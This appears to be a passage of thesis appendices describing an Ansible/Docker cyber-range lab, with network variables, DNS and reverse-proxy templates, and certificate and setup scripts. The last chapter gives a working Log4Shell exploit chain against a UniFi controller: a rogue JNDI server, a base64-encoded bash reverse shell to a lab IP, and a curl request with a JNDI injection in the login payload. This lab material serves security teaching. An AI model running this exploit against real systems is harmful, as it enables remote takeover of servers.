\clearpage\thispagestyle{empty}\phantom{}\clearpage

\chapter{Docker Networks' Ansible Variables} \label{ap1:ansible_vars_docker_networks}

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Networks.]
networks:
  internal_net:
    network_addr: 172.{{ random_byte }}.0.0/24
    gateway_addr: 172.{{ random_byte }}.0.254
    random_byte: "{{ random_byte }}"

  dmz_net:
    network_addr: 172.{{ random_byte | int - 5 }}.0.0/24
    gateway_addr: 172.{{ random_byte | int - 5 }}.0.254
    random_byte: "{{ random_byte | int - 5 }}"

  external_net:
    network_addr: 172.{{ random_byte | int - 10 }}.0.0/24
    gateway_addr: 172.{{ random_byte | int - 10 }}.0.254
    random_byte: "{{ random_byte | int - 10 }}"
\end{lstlisting}


\blankpage

\chapter{Example of Machine's Ansible Variables} \label{ap1:ansible_vars_machine}

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Machines.]
machines:
  - name: attackermachine
    image: kali_test_img
    volumes:
      - "/dev/net/tun:/dev/net/tun"
    group:
      - external
      - mesh
    published_ports:
      - 5900:5900
      - 6080:6080
    dns: 
      name: edge_router
      network: external_net
    networks:
      - name: external_net
        ipv4_address: 172.{{ networks.external_net.random_byte }}.0.2
\end{lstlisting}

\blankpage

\chapter{DNS Server Template Configuration} \label{ap1:ansible_vars_dns_template_conf}

\begin{lstlisting}[caption=DNS Server Template Configuration.]
acl "exclude" {
    {{ (machines | selectattr('name', '==', 'edge_router'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address') | first }};
};

acl internals {
    !exclude;
    172.{{ networks.internal_net.random_byte }}.0.0/24;
    172.{{ networks.dmz_net.random_byte }}.0.0/24;
};

view "internal" {
    match-clients { internals; };

    
    zone "{{ info.domain }}" {
        type master;
        file "/var/bind/db.internal.{{ info.domain }}";
    };
    
};

view "external" {
    match-clients { any; };

    
    zone "{{ info.domain }}" {
        type master;
        file "/var/bind/db.external.{{ info.domain }}";
    };
    

    # ... #
};}
\end{lstlisting}

\chapter{Reverse Proxy Template Configuration} \label{ap1:ansible_vars_reverse_proxy_template_conf}

\begin{lstlisting}[caption=Reverse Proxy Template Configuration.]
http {
    sendfile on;
    large_client_header_buffers 4 32k;

    
    
    upstream service-{{ loop.index }} {
    
    server {{ ((selected_machines | selectattr('name', '==', target.name))[0]['networks'] | selectattr('name', '==', target.network) | map(attribute='ipv4_address')) | first }}:{{ target.port }};
    
    }

    server {
        listen 80;
        server_name {{ vars.domain }};

        location / {
            return 301 https://$host$request_uri;
        }
    }

    server {
        listen 443 ssl;
        server_name {{ vars.domain }};

        ssl_certificate /etc/ssl/certs/{{ vars.domain }}.crt;
        ssl_certificate_key /etc/ssl/private/{{ vars.domain }}.key;

        location / {
            proxy_pass         http://service-{{ loop.index }};
            proxy_redirect     off;
            proxy_http_version 1.1;
            # ... #
        }
    }
    
}
\end{lstlisting}

\chapter{Generating an SSL Certificate for UniFi's Dashboard} \label{ap1:ansible_generate_ssl_certificate_unifi}

\begin{lstlisting}[language=bash,caption=Generating an SSL Certificate for UniFi's dashboard.]
#!/bin/bash

# Generate CA keys (private and public keys)
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt

# Generating Certificate Signing Request (notice the subjectAltName, which is mandatory, at least in Firefox!)
openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"

# Generate Server Public-key Certificate
openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key

# Remove Password from server's private key
openssl rsa -in server.key -out server_nopass.key
\end{lstlisting}

\blankpage

\chapter{Entry Point Bash Script} \label{ap1:log4j_entrypoint_script}

\begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.]
#!/bin/bash

cd "$( dirname "$0" )"

# UniFi Wizard Setup 

sleep 10
pip install -r requirements.txt
python3 setup.py

# Load new trusted root CA

cp /setup/ca.crt /usr/local/share/ca-certificates
update-ca-certificates

# Also in Firefox-Esr

cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
\end{lstlisting}

\blankpage

\chapter{Cloning Rogue JNDI GitHub Repository} \label{ap1:unifi_clone_rogue_jndi}

\begin{lstlisting}[language=bash,caption=Cloning Rogue JNDI GitHub Repository.]
# Clone Rogue JNDI GitHub repository and build project
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

# Create the Base64 payload 
echo 'bash -c bash -i >&/dev/tcp/172.152.0.2/4444 0>&1' | base64

# Running the malicious LDAP and HTTP Server with the Base64 malicious payload. The hostname flag denotes the target HTTP server.
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwP
iYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"

# Running Exploit
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:1389/o=tomcat}","strict":true}'
\end{lstlisting}